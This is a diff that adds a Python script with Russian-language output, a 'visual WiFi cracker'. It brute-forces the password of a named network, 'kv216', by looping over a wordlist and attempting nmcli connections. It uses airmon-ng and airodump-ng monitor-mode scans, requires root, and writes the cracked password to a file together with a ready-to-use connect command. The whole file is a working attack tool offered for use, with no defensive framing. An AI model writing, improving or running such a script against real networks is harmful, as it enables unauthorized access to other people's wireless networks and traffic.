@@ -1,0 +1,349 @@
+#!/usr/bin/env python3
+"""
+ВИЗУАЛЬНЫЙ WiFi CRACKER
+С прогресс-баром и цветным выводом
+"""
+
+import subprocess
+import time
+import os
+import sys
+from datetime import datetime
+
+# Цвета для терминала
+class Colors:
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    BLUE = '\033[94m'
+    MAGENTA = '\033[95m'
+    CYAN = '\033[96m'
+    WHITE = '\033[97m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    END = '\033[0m'
+
+# Конфигурация
+TARGET_SSID = "kv216"
+WORDLIST_FILE = "quick_list.txt"
+INTERFACE = "wlan0"
+
+class VisualWiFiCracker:
+    def __init__(self):
+        self.found = False
+        self.password = None
+        self.attempts = 0
+        self.start_time = None
+        self.total_passwords = 0
+        
+    def print_banner(self):
+        """Красивый баннер"""
+        os.system('clear' if os.name == 'posix' else 'cls')
+        print(f"""{Colors.CYAN}{Colors.BOLD}
+╔══════════════════════════════════════════════════════╗
+║               WiFi PASSWORD CRACKER                  ║
+║                 {Colors.GREEN}VISUAL EDITION{Colors.CYAN}                    ║
+╠══════════════════════════════════════════════════════╣
+║ {Colors.WHITE}Target:{Colors.YELLOW} {TARGET_SSID:<40} {Colors.CYAN}║
+║ {Colors.WHITE}Wordlist:{Colors.YELLOW} {WORDLIST_FILE:<38} {Colors.CYAN}║
+║ {Colors.WHITE}Interface:{Colors.YELLOW} {INTERFACE:<39} {Colors.CYAN}║
+╚══════════════════════════════════════════════════════╝{Colors.END}
+        """)
+    
+    def load_wordlist(self):
+        """Загрузка паролей с проверкой"""
+        print(f"{Colors.BLUE}[*]{Colors.END} Загрузка wordlist...")
+        
+        if not os.path.exists(WORDLIST_FILE):
+            print(f"{Colors.RED}[!]{Colors.END} Файл {WORDLIST_FILE} не найден!")
+            return None
+        
+        passwords = []
+        try:
+            with open(WORDLIST_FILE, 'r', encoding='utf-8', errors='ignore') as f:
+                for line in f:
+                    pwd = line.strip()
+                    if pwd:
+                        passwords.append(pwd)
+            
+            self.total_passwords = len(passwords)
+            
+            if self.total_passwords == 0:
+                print(f"{Colors.RED}[!]{Colors.END} Файл пустой!")
+                return None
+            
+            print(f"{Colors.GREEN}[+]{Colors.END} Загружено {self.total_passwords} паролей")
+            
+            # Показываем первые 5 паролей
+            print(f"{Colors.CYAN}[*]{Colors.END} Первые пароли:")
+            for i, pwd in enumerate(passwords[:5]):
+                print(f"    {Colors.YELLOW}{i+1}.{Colors.END} {pwd}")
+            if len(passwords) > 5:
+                print(f"    {Colors.YELLOW}...{Colors.END} и ещё {len(passwords)-5}")
+            
+            return passwords
+            
+        except Exception as e:
+            print(f"{Colors.RED}[!]{Colors.END} Ошибка: {e}")
+            return None
+    
+    def check_wifi_interface(self):
+        """Проверка Wi-Fi интерфейса"""
+        print(f"\n{Colors.BLUE}[*]{Colors.END} Проверка Wi-Fi интерфейса...")
+        
+        try:
+            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
+            
+            if INTERFACE not in result.stdout:
+                print(f"{Colors.RED}[!]{Colors.END} Интерфейс {INTERFACE} не найден!")
+                print(f"{Colors.YELLOW}[*]{Colors.END} Доступные интерфейсы:")
+                for line in result.stdout.split('\n'):
+                    if 'IEEE' in line:
+                        iface = line.split()[0]
+                        print(f"    {Colors.GREEN}✓{Colors.END} {iface}")
+                return False
+            
+            print(f"{Colors.GREEN}[+]{Colors.END} Интерфейс {INTERFACE} найден")
+            return True
+            
+        except Exception as e:
+            print(f"{Colors.RED}[!]{Colors.END} Ошибка: {e}")
+            return False
+    
+    def check_network_available(self):
+        """Проверка доступности сети"""
+        print(f"\n{Colors.BLUE}[*]{Colors.END} Поиск сети {TARGET_SSID}...")
+        
+        try:
+            # Быстрая проверка через iwlist
+            cmd = ['iwlist', INTERFACE, 'scan']
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            
+            if TARGET_SSID in result.stdout:
+                print(f"{Colors.GREEN}[+]{Colors.END} Сеть {TARGET_SSID} найдена!")
+                return True
+            else:
+                print(f"{Colors.YELLOW}[!]{Colors.END} Сеть не найдена в быстром сканировании")
+                print(f"{Colors.CYAN}[*]{Colors.END} Запускаю глубокое сканирование...")
+                
+                # Глубокое сканирование
+                return self.deep_scan()
+                
+        except Exception as e:
+            print(f"{Colors.YELLOW}[!]{Colors.END} Пропускаю проверку: {e}")
+            return True  # Продолжаем в любом случае
+    
+    def deep_scan(self):
+        """Глубокое сканирование сетей"""
+        try:
+            # Временное включение мониторного режима
+            subprocess.run(['airmon-ng', 'start', INTERFACE], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            monitor_iface = f"{INTERFACE}mon"
+            
+            # Быстрое сканирование
+            cmd = ['timeout', '10', 'airodump-ng', '--write', '/tmp/deepscan', 
+                   '--output-format', 'csv', monitor_iface]
+            
+            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            # Чтение результатов
+            if os.path.exists('/tmp/deepscan-01.csv'):
+                with open('/tmp/deepscan-01.csv', 'r') as f:
+                    content = f.read()
+                
+                if TARGET_SSID in content:
+                    print(f"{Colors.GREEN}[+]{Colors.END} Сеть найдена в глубоком сканировании!")
+                    found = True
+                else:
+                    print(f"{Colors.RED}[!]{Colors.END} Сеть не найдена")
+                    found = False
+            else:
+                found = False
+            
+            # Выключаем мониторный режим
+            subprocess.run(['airmon-ng', 'stop', monitor_iface], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            return found
+            
+        except Exception as e:
+            print(f"{Colors.YELLOW}[!]{Colors.END} Ошибка глубокого сканирования: {e}")
+            return False
+    
+    def try_password_nmcli(self, password):
+        """Попытка подключения через nmcli"""
+        try:
+            # Удаляем старое подключение
+            subprocess.run(['nmcli', 'connection', 'delete', 'id', TARGET_SSID],
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            # Пробуем подключиться
+            cmd = [
+                'nmcli', 'device', 'wifi', 'connect', TARGET_SSID,
+                'password', password, 'ifname', INTERFACE
+            ]
+            
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=8)
+            
+            # Проверяем результат
+            if "successfully" in result.stdout.lower():
+                return True
+            else:
+                return False
+                
+        except subprocess.TimeoutExpired:
+            return False
+        except Exception as e:
+            return False
+    
+    def display_progress_bar(self, current, total, elapsed, password):
+        """Отображение прогресс-бара"""
+        percent = (current / total) * 100
+        bar_length = 40
+        filled_length = int(bar_length * current // total)
+        bar = f"{Colors.GREEN}{'█' * filled_length}{Colors.WHITE}{'░' * (bar_length - filled_length)}{Colors.END}"
+        
+        # Расчет времени
+        if current > 0:
+            time_per_attempt = elapsed / current
+            remaining = (total - current) * time_per_attempt
+            time_str = f"{elapsed:.0f}s | ~{remaining:.0f}s осталось"
+        else:
+            time_str = f"{elapsed:.0f}s"
+        
+        # Очистка строки и вывод
+        sys.stdout.write('\r')
+        sys.stdout.write(f"{Colors.CYAN}[{bar}] {percent:.1f}%{Colors.END}")
+        sys.stdout.write(f" | {Colors.YELLOW}{current}/{total}{Colors.END}")
+        sys.stdout.write(f" | {Colors.MAGENTA}{time_str}{Colors.END}")
+        sys.stdout.write(f" | {Colors.WHITE}Тест: '{password[:20]}'{Colors.END}")
+        sys.stdout.flush()
+    
+    def crack(self):
+        """Основной процесс подбора"""
+        self.print_banner()
+        
+        # Проверка прав
+        if os.geteuid() != 0:
+            print(f"{Colors.RED}[!]{Colors.END} Запустите с sudo!")
+            print(f"    {Colors.YELLOW}sudo python3 {sys.argv[0]}{Colors.END}")
+            return False
+        
+        # Загрузка паролей
+        passwords = self.load_wordlist()
+        if not passwords:
+            return False
+        
+        # Проверка интерфейса
+        if not self.check_wifi_interface():
+            return False
+        
+        # Проверка сети
+        if not self.check_network_available():
+            print(f"\n{Colors.RED}[!]{Colors.END} Сеть недоступна. Проверьте:")
+            print(f"    1. Сеть {TARGET_SSID} включена")
+            print(f"    2. Вы в зоне действия")
+            print(f"    3. Wi-Fi адаптер работает")
+            return False
+        
+        print(f"\n{Colors.GREEN}[+]{Colors.END} Начинаю подбор пароля...")
+        print(f"{Colors.CYAN}[*]{Colors.END} Нажмите {Colors.YELLOW}Ctrl+C{Colors.END} для остановки\n")
+        
+        self.start_time = time.time()
+        
+        try:
+            for i, password in enumerate(passwords):
+                self.attempts = i + 1
+                elapsed = time.time() - self.start_time
+                
+                # Обновляем прогресс-бар
+                self.display_progress_bar(i + 1, len(passwords), elapsed, password)
+                
+                # Пробуем подключиться
+                if self.try_password_nmcli(password):
+                    self.found = True
+                    self.password = password
+                    
+                    # Заключительный вывод
+                    print(f"\n\n{Colors.GREEN}{'═'*60}{Colors.END}")
+                    print(f"{Colors.GREEN}{Colors.BOLD}         🎉 ПАРОЛЬ НАЙДЕН! 🎉{Colors.END}")
+                    print(f"{Colors.GREEN}{'═'*60}{Colors.END}")
+                    print(f"{Colors.CYAN}║{Colors.END} {Colors.WHITE}Сеть:{Colors.END} {Colors.YELLOW}{TARGET_SSID}{Colors.END}")
+                    print(f"{Colors.CYAN}║{Colors.END} {Colors.WHITE}Пароль:{Colors.END} {Colors.GREEN}{password}{Colors.END}")
+                    print(f"{Colors.CYAN}║{Colors.END} {Colors.WHITE}Попыток:{Colors.END} {Colors.MAGENTA}{i+1}{Colors.END}")
+                    print(f"{Colors.CYAN}║{Colors.END} {Colors.WHITE}Время:{Colors.END} {Colors.CYAN}{elapsed:.1f} секунд{Colors.END}")
+                    print(f"{Colors.GREEN}{'═'*60}{Colors.END}")
+                    
+                    self.save_result(password, i+1, elapsed)
+                    return True
+                
+                # Небольшая пауза
+                time.sleep(0.5)
+        
+        except KeyboardInterrupt:
+            print(f"\n\n{Colors.YELLOW}[!]{Colors.END} Подбор остановлен пользователем")
+            elapsed = time.time() - self.start_time
+            print(f"{Colors.CYAN}[*]{Colors.END} Проверено: {self.attempts} паролей")
+            print(f"{Colors.CYAN}[*]{Colors.END} Затраченное время: {elapsed:.1f} секунд")
+            return False
+        
+        # Если не нашли
+        elapsed = time.time() - self.start_time
+        print(f"\n\n{Colors.RED}{'═'*60}{Colors.END}")
+        print(f"{Colors.RED}{Colors.BOLD}         😞 ПАРОЛЬ НЕ НАЙДЕН 😞{Colors.END}")
+        print(f"{Colors.RED}{'═'*60}{Colors.END}")
+        print(f"{Colors.CYAN}║{Colors.END} Проверено паролей: {Colors.YELLOW}{len(passwords)}{Colors.END}")
+        print(f"{Colors.CYAN}║{Colors.END} Затраченное время: {Colors.CYAN}{elapsed:.1f} секунд{Colors.END}")
+        print(f"{Colors.CYAN}║{Colors.END} Средняя скорость: {Colors.MAGENTA}{len(passwords)/elapsed:.1f} паролей/сек{Colors.END}")
+        print(f"{Colors.RED}{'═'*60}{Colors.END}")
+        
+        return False
+    
+    def save_result(self, password, attempts, elapsed):
+        """Сохранение результата в файл"""
+        try:
+            filename = f"CRACKED_{TARGET_SSID}.txt"
+            with open(filename, 'w') as f:
+                f.write("╔══════════════════════════════════════╗\n")
+                f.write("║        WIFI PASSWORD CRACKED         ║\n")
+                f.write("╚══════════════════════════════════════╝\n\n")
+                f.write(f"🔓 СЕТЬ: {TARGET_SSID}\n")
+                f.write(f"🔑 ПАРОЛЬ: {password}\n")
+                f.write(f"⏱️  ВРЕМЯ: {elapsed:.1f} секунд\n")
+                f.write(f"🔢 ПОПЫТОК: {attempts}\n")
+                f.write(f"📅 ДАТА: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write("═" * 40 + "\n")
+            
+            print(f"\n{Colors.GREEN}[+]{Colors.END} Результат сохранён в {filename}")
+            
+            # Создаем команду для быстрого подключения
+            connect_cmd = f"nmcli device wifi connect {TARGET_SSID} password {password}"
+            print(f"\n{Colors.CYAN}[*]{Colors.END} Команда для подключения:")
+            print(f"    {Colors.YELLOW}{connect_cmd}{Colors.END}")
+            
+        except Exception as e:
+            print(f"{Colors.RED}[!]{Colors.END} Ошибка сохранения: {e}")
+
+def main():
+    """Точка входа"""
+    cracker = VisualWiFiCracker()
+    
+    try:
+        success = cracker.crack()
+        
+        if success:
+            print(f"\n{Colors.GREEN}[+]{Colors.END} Подключайтесь к сети {TARGET_SSID}!")
+        else:
+            print(f"\n{Colors.YELLOW}[!]{Colors.END} Попробуйте добавить больше паролей в {WORDLIST_FILE}")
+        
+        print(f"\n{Colors.CYAN}[*]{Colors.END} Нажмите Enter для выхода...")
+        input()
+        
+    except Exception as e:
+        print(f"\n{Colors.RED}[!]{Colors.END} Критическая ошибка: {e}")
+        input("Нажмите Enter...")
+
+if __name__ == "__main__":
+    main()
